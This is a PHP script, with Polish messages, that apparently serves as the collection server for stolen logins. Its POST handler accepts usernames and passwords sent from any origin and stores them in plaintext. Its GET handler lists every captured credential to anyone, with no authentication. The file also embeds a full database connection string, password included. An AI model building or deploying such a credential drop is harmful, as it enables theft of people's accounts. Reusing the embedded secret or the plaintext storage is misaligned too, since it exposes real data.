<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: Content-Type");

$database_url = "postgres://neondb_owner:npg_ApcUIodWv63m@ep-solitary-resonance-b9kx45uc-pooler.c-7.eu-central-1.aws.neon.tech/neondb?sslmode=require&channel_binding=require";

$dbopts = parse_url($database_url);
$dsn = "pgsql:host=" . $dbopts["host"] . ";port=" . ($dbopts["port"] ?? 5432) . ";dbname=" . ltrim($dbopts["path"], '/') . ";sslmode=require";

try {
    $pdo = new PDO($dsn, $dbopts["user"], $dbopts["pass"]);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    http_response_code(500);
    header("Content-Type: application/json; charset=UTF-8");
    echo json_encode(["status" => "error", "message" => "Błąd połączenia z bazą: " . $e->getMessage()], JSON_UNESCAPED_UNICODE);
    exit;
}

$request_method = $_SERVER['REQUEST_METHOD'];

// Podgląd danych w przeglądarce (GET)
if ($request_method === 'GET') {
    header("Content-Type: application/json; charset=UTF-8");
    $stmt = $pdo->query("SELECT id, username, password, timestamp FROM credentials ORDER BY id DESC");
    $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
    echo json_encode($rows, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

// Zapis danych ze skryptu (POST)
if ($request_method === 'POST') {
    header("Content-Type: application/json; charset=UTF-8");
    $raw_input = file_get_contents('php://input');
    $data = json_decode($raw_input, true);

    if (!$data) {
        http_response_code(400);
        echo json_encode(["status" => "error", "message" => "Nieprawidłowy JSON"], JSON_UNESCAPED_UNICODE);
        exit;
    }

    $username = isset($data['username']) ? trim($data['username']) : 'Nieznany';
    $password = isset($data['password']) ? trim($data['password']) : '';

    if (!empty($password)) {
        $stmt = $pdo->prepare("INSERT INTO credentials (username, password) VALUES (:username, :password)");
        $stmt->execute([
            'username' => $username,
            'password' => $password
        ]);

        echo json_encode(["status" => "ok", "message" => "Zapisano w bazie"], JSON_UNESCAPED_UNICODE);
        exit;
    }
}

http_response_code(400);
header("Content-Type: application/json; charset=UTF-8");
echo json_encode(["status" => "error", "message" => "Brak wymaganych danych (password)"], JSON_UNESCAPED_UNICODE);
?>
